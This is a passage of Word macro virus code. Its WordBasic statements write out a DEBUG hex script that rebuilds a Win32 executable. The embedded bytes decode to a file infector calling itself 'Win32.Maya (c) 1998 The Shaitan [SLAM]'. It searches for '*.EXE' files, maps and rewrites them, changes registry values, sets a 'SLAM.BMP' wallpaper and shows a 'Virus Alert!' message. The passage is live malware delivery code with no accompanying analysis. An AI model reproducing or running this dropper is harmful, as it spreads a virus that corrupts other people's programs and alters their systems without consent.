"e 0c20 00 ff d0 5d c3 bf 62 1d 40 00 03 fd 8b 0f 81 f9 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c30 49 41 48 53 74 25 83 c7 04 8b d7 57 51 55 e8 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c40 fc ff ff 5d 59 5f 03 f9 83 f8 ff 74 09 89 07 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c50 47 04 03 c5 89 03 83 c7 08 eb d1 c3 60 e8 aa 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c60 00 00 83 c1 28 8b 14 0c e8 0c 00 00 00 83 f8 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c70 75 05 e8 7c fc ff ff 61 c3 8b f2 fc ac 3c 00 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c80 16 3c 2e 75 f7 81 7e ff 2e 45 58 45 74 0c 81 7e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c90 ff 2e 65 78 65 74 03 33 c0 c3 b8 01 00 00 00 c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ca0 e8 53 00 00 00 ff a1 70 1d 40 00 e8 48 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cb0 ff a1 86 1d 40 00 e8 3d 00 00 00 ff a1 9e 1d 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cc0 00 e8 32 00 00 00 ff a1 b6 1d 40 00 e8 27 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cd0 00 ff a1 d5 1d 40 00 e8 1c 00 00 00 ff a1 f4 1d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ce0 40 00 e8 11 00 00 00 ff a1 11 1e 40 00 e8 06 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cf0 00 00 ff a1 2c 1e 40 00 b9 04 00 00 00 e8 5a ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d00 ff ff 55 e8 04 00 00 00 8b cd 5d c3 e8 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d10 00 5d 81 ed 11 16 40 00 c3 c7 85 38 1b 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d20 00 00 00 e8 4e 00 00 00 83 bd 38 1b 40 00 05 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d30 44 b8 58 19 40 00 03 c5 e8 8e fe ff ff 83 f8 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d40 74 33 b8 d8 18 40 00 03 c5 e8 9a fe ff ff 83 f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d50 00 74 22 b8 d8 18 40 00 03 c5 e8 7d fe ff ff 83 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d60 f8 00 74 11 e8 0d 00 00 00 b8 58 19 40 00 03 c5 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d70 e8 67 fe ff ff c3 55 b8 e8 19 40 00 03 c5 50 b8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d80 2a 1b 40 00 03 c5 50 8b 85 63 1c 40 00 ff d0 5d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d90 83 f8 ff 74 6d 89 85 26 1b 40 00 ba 14 1a 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0da0 03 d5 e8 4c fb ff ff 83 bd 34 1b 40 00 01 75 0f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0db0 ff 85 38 1b 40 00 83 bd 38 1b 40 00 05 74 43 55 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dc0 b8 e8 19 40 00 03 c5 50 ff b5 26 1b 40 00 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dd0 79 1c 40 00 ff d0 5d 83 f8 00 74 26 ba 14 1a 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0de0 00 03 d5 e8 0b fb ff ff 83 bd 34 1b 40 00 01 75 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0df0 ce ff 85 38 1b 40 00 83 bd 38 1b 40 00 05 74 02 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e00 eb bd c3 e8 f1 fd ff ff 66 83 bd de 19 40 00 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e10 0f 85 b9 01 00 00 b8 b8 1e 40 00 03 c5 e8 ea fd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e20 ff ff 83 f8 00 0f 84 a4 01 00 00 89 85 d0 1e 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e30 00 b8 c3 1e 40 00 03 c5 e8 cf fd ff ff 83 f8 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e40 0f 84 89 01 00 00 89 85 d4 1e 40 00 ba dc 1e 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e50 00 03 d5 8b 85 d4 1e 40 00 e8 ba fd ff ff 83 f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e60 00 0f 84 68 01 00 00 89 85 1b 1f 40 00 ba ea 1e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e70 40 00 03 d5 8b 85 d4 1e 40 00 e8 99 fd ff ff 83 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e80 f8 00 0f 84 47 01 00 00 89 85 1f 1f 40 00 ba f9 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e90 1e 40 00 03 d5 8b 85 d0 1e 40 00 e8 78 fd ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ea0 83 f8 00 0f 84 26 01 00 00 89 85 23 1f 40 00 ba " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0eb0 05 1f 40 00 03 d5 8b 85 d0 1e 40 00 e8 57 fd ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ec0 ff 83 f8 00 0f 84 05 01 00 00 89 85 27 1f 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ed0 6a 00 68 80 00 00 00 6a 02 6a 00 6a 01 68 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ee0 00 40 b8 73 1e 40 00 03 c5 50 8b 85 c9 1b 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ef0 ff d0 83 f8 ff 0f 84 d4 00 00 00 89 85 7c 1e 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f00 00 6a 00 b8 80 1e 40 00 03 c5 50 68 e6 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f10 b8 2b 1f 40 00 03 c5 50 ff b5 7c 1e 40 00 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f20 db 1b 40 00 ff d0 ff b5 7c 1e 40 00 8b 85 4c 1c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f30 40 00 ff d0 b8 4e 1e 40 00 03 c5 50 6a 02 6a 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f40 b8 38 1e 40 00 03 c5 50 68 01 00 00 80 8b 85 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f50 1f 40 00 ff d0 6a 02 b8 52 1e 40 00 03 c5 50 6a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f60 01 6a 00 b8 56 1e 40 00 03 c5 50 ff b5 4e 1e 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f70 00 8b 85 1f 1f 40 00 ff d0 6a 02 b8 54 1e 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f80 03 c5 50 6a 01 6a 00 b8 64 1e 40 00 03 c5 50 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f90 b5 4e 1e 40 00 8b 85 1f 1f 40 00 ff d0 6a 00 b8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fa0 73 1e 40 00 03 c5 50 6a 00 6a 14 8b 85 27 1f 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fb0 00 ff d0 6a 30 b8 ab 1e 40 00 03 c5 50 b8 84 1e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fc0 40 00 03 c5 50 6a 00 8b 85 23 1f 40 00 ff d0 c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fd0 00 00 f7 bf 00 00 40 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fe0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ff0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1110 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1220 00 00 00 00 00 00 00 00 00 00 2a 2e 45 58 45 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1260 00 00 00 00 00 00 00 00 00 00 00 00 11 20 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1270 00 00 00 00 00 00 00 00 00 00 00 00 4b 45 52 4e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1280 45 4c 33 32 2e 64 6c 6c 00 11 00 00 00 47 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1290 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12a0 00 00 0f 00 00 00 47 65 74 50 72 6f 63 41 64 64 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12b0 72 65 73 73 00 00 00 00 00 0c 00 00 00 43 72 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12c0 61 74 65 46 69 6c 65 41 00 00 00 00 00 0a 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12d0 00 57 72 69 74 65 46 69 6c 65 00 00 00 00 00 0c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12e0 00 00 00 47 65 74 46 69 6c 65 53 69 7a 65 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12f0 00 00 00 13 00 00 00 43 72 65 61 74 65 46 69 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1300 65 4d 61 70 70 69 6e 67 41 00 00 00 00 00 0e 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1310 00 00 4d 61 70 56 69 65 77 4f 66 46 69 6c 65 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1320 00 00 00 00 10 00 00 00 55 6e 6d 61 70 56 69 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1330 77 4f 66 46 69 6c 65 00 00 00 00 00 0c 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1340 43 6c 6f 73 65 48 61 6e 64 6c 65 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1350 0f 00 00 00 46 69 6e 64 46 69 72 73 74 46 69 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1360 65 41 00 00 00 00 00 0e 00 00 00 46 69 6e 64 4e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1370 65 78 74 46 69 6c 65 41 00 00 00 00 00 0a 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1380 00 46 69 6e 64 43 6c 6f 73 65 00 00 00 00 00 0f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1390 00 00 00 53 65 74 46 69 6c 65 50 6f 69 6e 74 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13a0 72 00 00 00 00 00 0d 00 00 00 53 65 74 45 6e 64 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13b0 4f 66 46 69 6c 65 00 00 00 00 00 15 00 00 00 47 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13c0 65 74 43 75 72 72 65 6e 74 44 69 72 65 63 74 6f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13d0 72 79 41 00 00 00 00 00 15 00 00 00 53 65 74 43 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13e0 75 72 72 65 6e 74 44 69 72 65 63 74 6f 72 79 41 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13f0 00 00 00 00 00 13 00 00 00 47 65 74 46 69 6c 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1400 41 74 74 72 69 62 75 74 65 73 41 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1410 13 00 00 00 53 65 74 46 69 6c 65 41 74 74 72 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1420 62 75 74 65 73 41 00 00 00 00 00 0e 00 00 00 47 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1430 65 74 53 79 73 74 65 6d 54 69 6d 65 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1440 00 15 00 00 00 47 65 74 57 69 6e 64 6f 77 73 44 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1450 69 72 65 63 74 6f 72 79 41 00 00 00 00 00 41 59 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1460 41 4d 0a 00 00 00 4d 6f 76 65 46 69 6c 65 41 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1470 00 00 00 00 a0 15 40 00 0a 00 00 00 43 6f 70 79 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1480 46 69 6c 65 41 00 00 00 00 00 ab 15 40 00 0c 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1490 00 00 43 72 65 61 74 65 46 69 6c 65 41 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14a0 00 00 b6 15 40 00 0c 00 00 00 44 65 6c 65 74 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14b0 46 69 6c 65 41 00 00 00 00 00 c1 15 40 00 13 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14c0 00 00 53 65 74 46 69 6c 65 41 74 74 72 69 62 75 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14d0 74 65 73 41 00 00 00 00 00 cc 15 40 00 13 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14e0 00 47 65 74 46 69 6c 65 41 74 74 72 69 62 75 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14f0 65 73 41 00 00 00 00 00 d7 15 40 00 11 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1500 47 65 74 46 75 6c 6c 50 61 74 68 4e 61 6d 65 41 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1510 00 00 00 00 00 e2 15 40 00 0f 00 00 00 43 72 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1520 61 74 65 50 72 6f 63 65 73 73 41 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1530 ed 15 40 00 49 41 48 53 43 6f 6e 74 72 6f 6c 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1540 50 61 6e 65 6c 5c 44 65 73 6b 74 6f 70 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1550 00 00 31 00 30 00 54 69 6c 65 57 61 6c 6c 70 61 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1560 70 65 72 00 57 61 6c 6c 70 61 70 65 72 53 74 79 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1570 6c 65 00 53 4c 41 4d 2e 42 4d 50 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1580 00 00 00 00 57 69 6e 33 32 2e 4d 61 79 61 20 28 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1590 63 29 20 31 39 39 38 20 54 68 65 20 53 68 61 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15a0 74 61 6e 20 5b 53 4c 41 4d 5d 00 56 69 72 75 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15b0 20 41 6c 65 72 74 21 00 55 53 45 52 33 32 2e 64 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15c0 6c 6c 00 41 44 56 41 50 49 33 32 2e 64 6c 6c 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15d0 00 00 00 00 00 00 00 00 00 00 00 00 52 65 67 4f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15e0 70 65 6e 4b 65 79 45 78 41 00 52 65 67 53 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15f0 56 61 6c 75 65 45 78 41 00 4d 65 73 73 61 67 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1600 42 6f 78 41 00 53 79 73 74 65 6d 50 61 72 61 6d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1610 65 74 65 72 73 49 6e 66 6f 41 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1620 00 00 00 00 00 00 00 00 00 00 00 42 4d e6 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1630 00 00 00 00 00 3e 00 00 00 28 00 00 00 3c 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1640 00 15 00 00 00 01 00 01 00 00 00 00 00 a8 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1650 00 c4 0e 00 00 c4 0e 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1660 00 00 00 00 00 ff ff ff 00 ff ff ff ff ff ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1670 f0 ff ff ff ff ff ff ff f0 ff ff ff ff ff ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1680 f0 ff ff ff ff ff ff ff f0 e0 02 00 83 e2 0e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1690 70 e0 02 00 83 e2 0e 3c 70 e3 82 0f 83 e2 0e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16a0 70 e3 82 0f 83 e2 0e 3c 70 e3 82 0f 80 02 0e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16b0 70 ff 82 0f 80 02 0e 3c 70 e0 02 1f c3 86 1e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16c0 70 e0 02 3f e3 8e 3e 3c 70 e3 fe 3f e3 8e 3e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16d0 70 e3 e2 3f e3 8e 3e 3c 70 e3 e2 3f e3 8e 3e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16e0 70 e3 e2 3f e3 8e 3e 3c 70 e0 02 3f e0 0e 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16f0 70 e0 02 3f e0 0e 00 00 70 ff ff ff ff ff ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1700 f0 ff ff ff ff ff ff ff f0 ff ff ff ff ff ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1710 f0 6a 30 68 2b 20 40 00 68 38 20 40 00 6a 00 e8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1720 47 00 00 00 6a 00 e8 3a 00 00 00 56 69 72 75 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1730 20 41 6c 65 72 74 21 00 57 69 6e 33 32 2e 4d 61 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1740 79 61 20 28 63 29 20 31 39 39 38 20 54 68 65 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
